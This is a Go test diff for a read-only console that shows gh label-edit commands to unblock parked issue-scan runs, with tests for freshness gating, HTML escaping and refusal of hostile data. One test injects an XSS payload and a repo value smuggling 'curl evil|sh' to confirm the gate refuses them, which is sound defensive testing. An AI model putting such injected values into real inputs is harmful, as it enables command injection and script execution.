@@ -3,14 +3,34 @@ package graph
 import (
 	"bytes"
 	"context"
+	"encoding/json"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 )
+
+// freshHiveCivilizationAssemblyProjectionFixture returns
+// hiveCivilizationAssemblyProjectionFixture (graph/handlers_test.go) with its
+// baked-in generated_at ("2026-06-23T09:30:00Z", which renders FreshnessStale
+// against any realistic test clock) rewritten to now. Unblock hints/commands
+// are gated to FreshnessCurrent only (buildConsoleIssueScan), so tests that
+// assert real gh-command rendering must serve a fixture that lands current,
+// not the shared fixture's stale timestamp.
+func freshHiveCivilizationAssemblyProjectionFixture() string {
+	const staleGeneratedAt = `"generated_at": "2026-06-23T09:30:00Z"`
+	freshGeneratedAt := fmt.Sprintf(`"generated_at": %q`, time.Now().UTC().Format(time.RFC3339))
+	replaced := strings.Replace(hiveCivilizationAssemblyProjectionFixture, staleGeneratedAt, freshGeneratedAt, 1)
+	if replaced == hiveCivilizationAssemblyProjectionFixture {
+		panic("freshHiveCivilizationAssemblyProjectionFixture: staleGeneratedAt marker not found in fixture; fixture format changed")
+	}
+	return replaced
+}
 
 func TestConsoleIssueScanCardAgentsCombinesAssignedAndTouching(t *testing.T) {
 	// Assigned + touching are both surfaced (deduped, assigned first) so a
@@ -259,7 +279,7 @@ func TestConsoleIssueScanDrawerLinksProjectedIssueURL(t *testing.T) {
 		TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 42, URL: "https://github.com/transpara-ai/site/issues/42"},
 	}
 	var buf bytes.Buffer
-	if err := consoleIssueScanDrawer(linked, true).Render(context.Background(), &buf); err != nil {
+	if err := consoleIssueScanDrawer(linked, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf); err != nil {
 		t.Fatalf("render: %v", err)
 	}
 	if !strings.Contains(buf.String(), `href="https://github.com/transpara-ai/site/issues/42"`) {
@@ -269,7 +289,7 @@ func TestConsoleIssueScanDrawerLinksProjectedIssueURL(t *testing.T) {
 	// No projected URL → plain text label, no dangling empty anchor.
 	noURL := OpsCivilizationIssueScanKanbanCard{RunID: "r", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 43}}
 	var buf2 bytes.Buffer
-	if err := consoleIssueScanDrawer(noURL, true).Render(context.Background(), &buf2); err != nil {
+	if err := consoleIssueScanDrawer(noURL, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
 		t.Fatalf("render: %v", err)
 	}
 	if strings.Contains(buf2.String(), "<a href") {
@@ -299,24 +319,71 @@ func TestConsoleIssueScanBoardHidesSummaryWhenUnavailable(t *testing.T) {
 	}
 }
 
-func TestConsoleIssueScanFragmentResetsDrawerOnlyWhenUnavailable(t *testing.T) {
-	// Unavailable poll must emit an out-of-band reset that clears an open drawer,
-	// so stale run details cannot survive the fail-closed board.
-	var unavail bytes.Buffer
-	if err := consoleIssueScanFragment(ConsoleIssueScan{Freshness: FreshnessUnavailable, Notices: []string{"down"}}).Render(context.Background(), &unavail); err != nil {
-		t.Fatalf("render unavailable: %v", err)
+func TestConsoleIssueScanFragmentResetsDrawerUnlessCurrent(t *testing.T) {
+	// The drawer can hold operator label-surgery commands (e.g. gh issue edit)
+	// that are only ever offered from a verified-current projection
+	// (buildConsoleIssueScan gates the unblock plan to FreshnessCurrent). So
+	// any poll that reports the projection is no longer verified-current must
+	// clear an open drawer, or a stale/partial/unavailable poll could leave a
+	// now-invalid command sitting in the DOM, copyable. This is a class fix
+	// over the whole freshness domain: allowlist the single proven-safe
+	// preserve branch (current) rather than denylist known-bad states, so an
+	// unrecognized/future freshness value clears the drawer too, never
+	// preserves it.
+	tests := []struct {
+		name          string
+		freshness     ConsoleFreshness
+		wantDrawerOOB bool
+	}{
+		{
+			name:          "current preserves the open drawer",
+			freshness:     FreshnessCurrent,
+			wantDrawerOOB: false,
+		},
+		{
+			name:          "stale clears the open drawer",
+			freshness:     FreshnessStale,
+			wantDrawerOOB: true,
+		},
+		{
+			name:          "partial clears the open drawer",
+			freshness:     FreshnessPartial,
+			wantDrawerOOB: true,
+		},
+		{
+			name:          "unavailable clears the open drawer",
+			freshness:     FreshnessUnavailable,
+			wantDrawerOOB: true,
+		},
+		{
+			name:          "unrecognized freshness value clears the open drawer",
+			freshness:     ConsoleFreshness("some-future-state"),
+			wantDrawerOOB: true,
+		},
 	}
-	if !strings.Contains(unavail.String(), "hx-swap-oob") || !strings.Contains(unavail.String(), `id="console-intake-drawer"`) {
-		t.Error("unavailable poll must emit an out-of-band drawer reset")
-	}
-	// A usable poll must NOT emit a drawer element, or the poll would erase an
-	// open drawer (the Plan-2b regression). It swaps only #console-intake.
-	var ok bytes.Buffer
-	if err := consoleIssueScanFragment(ConsoleIssueScan{Freshness: FreshnessCurrent, GeneratedAt: time.Now().UTC().Format(time.RFC3339)}).Render(context.Background(), &ok); err != nil {
-		t.Fatalf("render usable: %v", err)
-	}
-	if strings.Contains(ok.String(), "console-intake-drawer") {
-		t.Error("usable poll must not touch the drawer (would erase an open drawer)")
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			scan := ConsoleIssueScan{Freshness: tt.freshness, GeneratedAt: time.Now().UTC().Format(time.RFC3339)}
+			if tt.freshness != FreshnessCurrent {
+				scan.Notices = []string{"down"}
+			}
+			var buf bytes.Buffer
+			if err := consoleIssueScanFragment(scan).Render(context.Background(), &buf); err != nil {
+				t.Fatalf("render: %v", err)
+			}
+			out := buf.String()
+
+			// The board surface always renders regardless of freshness.
+			if !strings.Contains(out, `data-console-surface="intake"`) {
+				t.Error("fragment must always render the intake board surface")
+			}
+
+			hasDrawerOOB := strings.Contains(out, "hx-swap-oob") && strings.Contains(out, `id="console-intake-drawer"`)
+			if hasDrawerOOB != tt.wantDrawerOOB {
+				t.Errorf("freshness=%q: drawer OOB reset present=%v, want=%v", tt.freshness, hasDrawerOOB, tt.wantDrawerOOB)
+			}
+		})
 	}
 }
 
@@ -503,7 +570,7 @@ func TestConsoleIntakeSurfaceEscapesHostileProjectionData(t *testing.T) {
 	}
 	card := board.Columns[0].Cards[0]
 	var buf2 bytes.Buffer
-	if err := consoleIssueScanDrawer(card, true).Render(context.Background(), &buf2); err != nil {
+	if err := consoleIssueScanDrawer(card, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
 		t.Fatalf("render drawer: %v", err)
 	}
 
@@ -532,5 +599,519 @@ func TestConsoleIntakeSurfaceEscapesHostileProjectionData(t *testing.T) {
 
 	if !strings.Contains(boardOut, "&lt;script") {
 		t.Error("expected escaped form \"&lt;script\" in board output; escaping did not occur (data may have vanished instead of being escaped)")
+	}
+}
+
+// End-to-end through the real handler + shared fixture: the cleanly
+// label-parked run offers the exact commands; terminal-run copy present.
+func TestConsoleIntakeDrawerRendersUnblockCommands(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
+	w := httptest.NewRecorder()
+	mux.ServeHTTP(w, req)
+	if w.Code != http.StatusOK {
+		t.Fatalf("status = %d", w.Code)
+	}
+	body := w.Body.String()
+	for _, want := range []string{
+		"gh issue edit 172 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
+		"A parked run is terminal.",
+		"hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
+		"--dispatch",
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("drawer missing %q", want)
+		}
+	}
+	if strings.Contains(body, "protected-action boundary") {
+		t.Error("protected warning rendered though no protected label is on docs#172")
+	}
+}
+
+// End-to-end negative: run_site_115 has sibling blockers protected_action +
+// stale_target, so the gate must refuse — no command anywhere, projected
+// required action still shown. Uses the FRESH fixture (FreshnessCurrent)
+// deliberately: this test asserts the sibling-blocker GATE refuses, not the
+// freshness gate (which has its own dedicated coverage in
+// TestConsoleIntakeStaleProjectionSuppressesUnblock). A stale fixture here
+// would make the assertion trivially true for the wrong reason.
+func TestConsoleIntakeDrawerNoCommandForNonLabelBlocker(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_site_115&stage=surface_ready_for_human_result_pr", nil)
+	w := httptest.NewRecorder()
+	mux.ServeHTTP(w, req)
+	body := w.Body.String()
+	if strings.Contains(body, "gh issue edit") {
+		t.Error("gate must refuse commands for a run with a sibling non-label blocker (stale_target)")
+	}
+	if !strings.Contains(body, "human must authorize protected repo action") {
+		t.Error("projected RequiredAction must still render when the gate refuses")
+	}
+}
+
+// CFAR (codex, PR #203, P2): buildConsoleIssueScan stamped UnblockAvailable —
+// and handleConsoleIntakeCard derived/rendered the plan — from ANY freshness
+// other than FreshnessUnavailable, so a stale projection's out-of-date label
+// snapshot could still produce exact "gh issue edit" commands. This test
+// serves the shared fixture AS-IS (its baked-in generated_at is
+// "2026-06-23T09:30:00Z", which is FreshnessStale against any realistic test
+// clock — see freshHiveCivilizationAssemblyProjectionFixture's doc comment)
+// and asserts the board still renders honestly (cards, required actions) but
+// the gate suppresses every unblock hint and command.
+func TestConsoleIntakeStaleProjectionSuppressesUnblock(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture) // stale, deliberately unmodified
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	boardReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
+	boardW := httptest.NewRecorder()
+	mux.ServeHTTP(boardW, boardReq)
+	if boardW.Code != http.StatusOK {
+		t.Fatalf("board status = %d, want 200; body: %s", boardW.Code, boardW.Body.String())
+	}
+	boardBody := boardW.Body.String()
+	if !strings.Contains(boardBody, "transpara-ai/docs#172") {
+		t.Error("stale board must still render its cards honestly (data, not commands, is suppressed)")
+	}
+	if strings.Contains(boardBody, "unblock available") {
+		t.Error("stale board must not render the unblock hint — the label snapshot is out of date")
+	}
+
+	drawerReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
+	drawerW := httptest.NewRecorder()
+	mux.ServeHTTP(drawerW, drawerReq)
+	if drawerW.Code != http.StatusOK {
+		t.Fatalf("drawer status = %d, want 200; body: %s", drawerW.Code, drawerW.Body.String())
+	}
+	drawerBody := drawerW.Body.String()
+	if !strings.Contains(drawerBody, "human must clarify issue scope before runtime continues") {
+		t.Error("stale drawer must still show the projected required action honestly")
+	}
+	if strings.Contains(drawerBody, "gh issue edit") {
+		t.Error("stale drawer must NOT render a gh command — the label snapshot may be out of date")
+	}
+}
+
+// Board hint appears exactly once with the shared fixture: only
+// run_docs_172_scope passes the gate (run_docs_172 = duplicate_chain,
+// run_site_115 = protected_action + stale_target siblings).
+func TestConsoleIntakeCardUnblockHint(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
+	w := httptest.NewRecorder()
+	mux.ServeHTTP(w, req)
+	if got := strings.Count(w.Body.String(), "unblock available"); got != 1 {
+		t.Errorf("unblock hint count = %d, want exactly 1 (only run_docs_172_scope passes the gate)", got)
+	}
+}
+
+// Component-level: cc:protected-action renders as its own warned command,
+// never folded into the scope command.
+func TestConsoleIntakeDrawerSplitsProtectedCommand(t *testing.T) {
+	card := unblockCard("run-split", "needs_human_scope", []string{"cc:needs-human-scope", "cc:protected-action"})
+	plan, ok := consoleIssueScanUnblockPlan(card, consoleIssueScanRunBlockerTypes(boardWith(card)))
+	if !ok {
+		t.Fatal("expected plan for label-parked card")
+	}
+	var buf bytes.Buffer
+	if err := consoleIssueScanDrawer(card, true, plan, true).Render(context.Background(), &buf); err != nil {
+		t.Fatalf("render: %v", err)
+	}
+	body := buf.String()
+	for _, want := range []string{
+		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
+		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
+		"run it only if you authorize the protected action",
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("split drawer missing %q", want)
+		}
+	}
+	for _, forbid := range []string{
+		"--remove-label cc:needs-human-scope --remove-label cc:protected-action",
+		"--remove-label cc:protected-action --add-label",
+	} {
+		if strings.Contains(body, forbid) {
+			t.Errorf("protected removal folded into another command: %q", forbid)
+		}
+	}
+}
+
+func TestConsoleIntakeEmptyStateExplainsScanCycle(t *testing.T) {
+	// A complete, fresh projection with zero issue-scan AND zero issue-intake
+	// records is a genuinely usable-but-empty board (verified via
+	// issueScanKanbanFromIssueIntakeFallback: with no issue_intake_projection
+	// issues either, it returns zero columns rather than fabricating fallback
+	// cards). The empty state must teach how runs get here.
+	emptyProjection := fmt.Sprintf(`{
+		"projection_schema_version": "1.0.0",
+		"projection_subject": "civilization_assembly",
+		"derivation_status": "complete",
+		"generated_at": %q,
+		"issue_scan_projection": {}
+	}`, time.Now().UTC().Format(time.RFC3339))
+
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
+			http.NotFound(w, r)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, emptyProjection)
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
+	w := httptest.NewRecorder()
+	mux.ServeHTTP(w, req)
+
+	if w.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
+	}
+	body := w.Body.String()
+	for _, want := range []string{"No issue-scan runs projected.", "hive factory scan-issues", "cc:pr-ready"} {
+		if !strings.Contains(body, want) {
+			t.Errorf("empty intake body missing %q; body: %s", want, body)
+		}
+	}
+}
+
+// READ-ONLY BOUNDARY: the intake surface — full page, fragment, and an open
+// unblock drawer — must carry zero write affordances. The unblock section is
+// selectable copy-paste text, never a control; the only governed write route
+// (/ops/hive/model-policy) must not leak here in any form. Card-open buttons
+// and the drawer close button are legitimately type="button" and are NOT
+// asserted absent — only form/hx-write/submit/write-route markers are.
+func TestConsoleIntakeSurfaceRendersNoWriteControls(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	bodies := map[string]string{}
+	for name, target := range map[string]string{
+		"page":     "http://site.test/console/intake",
+		"fragment": "http://site.test/console/intake/fragment",
+		// run_docs_172_scope / select_and_design_approach is the fixture card
+		// whose gate passes: its unblock section renders real commands, so
+		// this is the strongest case for a leaked write control.
+		"drawer": "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach",
+	} {
+		req := httptest.NewRequest(http.MethodGet, target, nil)
+		w := httptest.NewRecorder()
+		mux.ServeHTTP(w, req)
+		if w.Code != http.StatusOK {
+			t.Fatalf("%s: status = %d", name, w.Code)
+		}
+		bodies[name] = w.Body.String()
+	}
+
+	// Sanity: the drawer actually rendered the unblock command, so a passing
+	// no-write-controls assertion below isn't vacuous (nothing to leak).
+	if !strings.Contains(bodies["drawer"], "gh issue edit 172 --repo transpara-ai/docs") {
+		t.Fatal("drawer fixture must render the unblock command, or this test proves nothing")
+	}
+
+	for name, body := range bodies {
+		lower := strings.ToLower(body)
+		for _, forbidden := range []string{
+			"<form", "hx-post", "hx-put", "hx-delete", "hx-patch",
+			`type="submit"`, "/ops/hive/model-policy",
+		} {
+			if strings.Contains(lower, strings.ToLower(forbidden)) {
+				t.Errorf("%s: read-only intake surface must not render %q", name, forbidden)
+			}
+		}
+	}
+}
+
+// Hostile projection data must neither escape into markup nor produce a
+// command. Two hostile target repos share one run each: one carries HTML
+// injection, the other shell metacharacters. consoleUnblockRepoPattern is a
+// strict owner/repo allowlist (graph/console_unblock.go), so both refuse to
+// render ANY command — this asserts the fail-closed GATE, not just escaping.
+func TestConsoleIntakeUnblockGateRefusesHostileData(t *testing.T) {
+	const runHTML = "run_hostile_html_226"
+	const runShell = "run_hostile_shell_226"
+	const stageHTML = "select_and_design_approach"
+	const stageShell = "select_and_design_approach"
+	const repoHTML = `transpara-ai/docs"><script>alert(1)</script>`
+	const repoShell = `transpara-ai/docs; curl evil|sh`
+
+	fixture := fmt.Sprintf(`{
+		"projection_schema_version": "1.0.0",
+		"projection_subject": "civilization_assembly",
+		"derivation_status": "complete",
+		"generated_at": %q,
+		"issue_scan_projection": {
+			"runs": [
+				{
+					"run_id": %q,
+					"state": "human_action",
+					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
+				},
+				{
+					"run_id": %q,
+					"state": "human_action",
+					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
+				}
+			],
+			"stages": [
+				{"run_id": %q, "stage_id": %q, "current_state": "human_action"},
+				{"run_id": %q, "stage_id": %q, "current_state": "human_action"}
+			],
+			"blockers": [
+				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"},
+				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"}
+			]
+		}
+	}`,
+		time.Now().UTC().Format(time.RFC3339),
+		runHTML, repoHTML,
+		runShell, repoShell,
+		runHTML, stageHTML,
+		runShell, stageShell,
+		runHTML, stageHTML,
+		runShell, stageShell,
+	)
+
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, fixture)
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	get := func(target string) string {
+		req := httptest.NewRequest(http.MethodGet, target, nil)
+		w := httptest.NewRecorder()
+		mux.ServeHTTP(w, req)
+		if w.Code != http.StatusOK {
+			t.Fatalf("%s: status = %d", target, w.Code)
+		}
+		return w.Body.String()
+	}
+
+	pageBody := get("http://site.test/console/intake")
+	drawerHTML := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runHTML) + "&stage=" + url.QueryEscape(stageHTML))
+	drawerShell := get("http://site.test/console/intake/card?run=" + url.QueryEscape(runShell) + "&stage=" + url.QueryEscape(stageShell))
+	combined := pageBody + drawerHTML + drawerShell
+
+	if strings.Contains(combined, "<script>alert") {
+		t.Error("raw <script>alert survived escaping in the intake surface")
+	}
+	// "gh issue edit" must be absent everywhere: the gate refuses to build ANY
+	// command for a hostile repo, so neither hostile payload (the HTML
+	// injection nor "curl evil|sh") can ever appear inside a gh command. This
+	// is the gate assertion the brief calls for. The repo string legitimately
+	// still renders as escaped, read-only display text elsewhere on the
+	// card/drawer (e.g. the "Issue" field) — that is not a command and is not
+	// asserted absent here.
+	if strings.Contains(combined, "gh issue edit") {
+		t.Error("gate must refuse ANY command for a hostile repo — repo pattern is a strict owner/repo allowlist")
+	}
+	if !strings.Contains(pageBody, "&lt;script") {
+		t.Error(`expected escaped form "&lt;script" in page output; escaping did not occur`)
+	}
+	if strings.Contains(strings.ToLower(combined), "unblock available") {
+		t.Error(`"unblock available" hint must be suppressed too — the gate refused, so UnblockAvailable must be false`)
+	}
+}
+
+// CFAR (cross-family, P2): the drawer lives outside #console-intake-drawer's
+// OOB-reset owner (consoleIssueScanFragment only resets on a freshness
+// downgrade), so a later poll that stays FreshnessCurrent but changes the
+// underlying labels/blockers left a stale command copyable. The fix is a
+// self-refreshing drawer: assert the rendered <aside> carries the exact
+// hx-get/hx-trigger/hx-swap attributes that make it re-request its own card
+// URL every 10s.
+func TestConsoleIntakeDrawerSelfRefreshes(t *testing.T) {
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
+	w := httptest.NewRecorder()
+	mux.ServeHTTP(w, req)
+	if w.Code != http.StatusOK {
+		t.Fatalf("status = %d", w.Code)
+	}
+	body := w.Body.String()
+	// templ's attribute escaping (html.EscapeString) renders "&" as "&amp;" in
+	// HTML attribute values, so the query-escaped card URL's "&" between run=
+	// and stage= appears as "&amp;" in the served markup — assert on the
+	// actual encoding, not the raw URL string.
+	wantURL := `hx-get="/console/intake/card?run=run_docs_172_scope&amp;stage=select_and_design_approach"`
+	for _, want := range []string{
+		wantURL,
+		`hx-trigger="every 10s"`,
+		`hx-swap="outerHTML"`,
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("drawer missing %q; body:\n%s", want, body)
+		}
+	}
+}
+
+// CFAR (cross-family, P2), proof of the fix's actual effect: a drawer opened
+// against a FreshnessCurrent projection renders a real gh command; once the
+// underlying label evidence changes (still FreshnessCurrent — no downgrade,
+// so the board's OOB reset never fires), a re-request of the SAME drawer URL
+// must re-derive the plan and drop the command, because the mismatch gate
+// (consoleIssueScanUnblockPlan) refuses a needs_human_scope blocker no longer
+// corroborated by cc:needs-human-scope or cc:pr-deferred. This is what the
+// drawer's 10s self-refresh (TestConsoleIntakeDrawerSelfRefreshes) actually
+// buys operationally.
+func TestConsoleIntakeDrawerRefreshDropsCommandWhenLabelsChange(t *testing.T) {
+	fresh := freshHiveCivilizationAssemblyProjectionFixture()
+
+	// Scope the label-surgery precisely to the run_docs_172_scope run block:
+	// the same "cc:needs-human-scope" label string also appears verbatim in
+	// unrelated runs (e.g. run_docs_172's blockers), so a global replace
+	// across the whole fixture would corrupt data this test doesn't own.
+	// Isolate the run_docs_172_scope run object by its run_id anchor and its
+	// closing "source_refs" line, replace only within that slice, then splice
+	// it back — this guarantees every other run/blocker in the fixture is
+	// untouched.
+	const blockStart = `"run_id": "run_docs_172_scope",`
+	const blockEnd = `"source_refs": ["github:transpara-ai/docs#172"]`
+	startIdx := strings.Index(fresh, blockStart)
+	if startIdx == -1 {
+		t.Fatal("run_docs_172_scope run block not found in fixture; fixture format changed")
+	}
+	endIdx := strings.Index(fresh[startIdx:], blockEnd)
+	if endIdx == -1 {
+		t.Fatal("run_docs_172_scope run block close marker not found; fixture format changed")
+	}
+	endIdx += startIdx + len(blockEnd)
+	block := fresh[startIdx:endIdx]
+
+	const needsHumanScopeLabel = `"labels": ["cc:needs-human-scope"]`
+	wantOccurrences := strings.Count(block, needsHumanScopeLabel)
+	if wantOccurrences == 0 {
+		t.Fatal("run_docs_172_scope run block does not contain cc:needs-human-scope; fixture format changed")
+	}
+	modifiedBlock := strings.ReplaceAll(block, needsHumanScopeLabel, `"labels": ["cc:pr-ready"]`)
+	if modifiedBlock == block {
+		t.Fatal("label surgery made no change to the run_docs_172_scope block")
+	}
+	modifiedFixture := fresh[:startIdx] + modifiedBlock + fresh[endIdx:]
+
+	// Verify the surgery kept valid JSON and left the sibling run_docs_172
+	// blocker's identical label string alone.
+	var parsed map[string]any
+	if err := json.Unmarshal([]byte(modifiedFixture), &parsed); err != nil {
+		t.Fatalf("modified fixture is not valid JSON: %v", err)
+	}
+	if strings.Count(modifiedFixture, needsHumanScopeLabel) != strings.Count(fresh, needsHumanScopeLabel)-wantOccurrences {
+		t.Fatal("label surgery leaked outside the run_docs_172_scope block")
+	}
+
+	// Servable, swappable fixture: starts by serving the ORIGINAL fresh
+	// fixture (command present), then is swapped to serve the MODIFIED fresh
+	// fixture (label removed) before the second request — simulating another
+	// operator's label edit landing between two polls of the same open
+	// drawer.
+	var mu sync.Mutex
+	current := fresh
+	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mu.Lock()
+		body := current
+		mu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = io.WriteString(w, body)
+	}))
+	defer hiveSrv.Close()
+	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)
+
+	h := newConsoleTestHandlers()
+	mux := http.NewServeMux()
+	h.Register(mux)
+
+	drawerURL := "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach"
+	get := func() string {
+		req := httptest.NewRequest(http.MethodGet, drawerURL, nil)
+		w := httptest.NewRecorder()
+		mux.ServeHTTP(w, req)
+		if w.Code != http.StatusOK {
+			t.Fatalf("status = %d", w.Code)
+		}
+		return w.Body.String()
+	}
+
+	firstBody := get()
+	if !strings.Contains(firstBody, "gh issue edit") {
+		t.Fatal("first request must render the unblock command, or this test proves nothing about the refresh")
+	}
+
+	mu.Lock()
+	current = modifiedFixture
+	mu.Unlock()
+
+	secondBody := get()
+	if strings.Contains(secondBody, "gh issue edit") {
+		t.Error("refreshed drawer still rendered a gh command after cc:needs-human-scope was removed — mismatch gate must refuse (blocker needs_human_scope without corroborating label)")
+	}
+	if !strings.Contains(secondBody, "human must clarify issue scope before runtime continues") {
+		t.Error("refreshed drawer must still render the projected required action honestly, even when the gate refuses a command")
 	}
 }
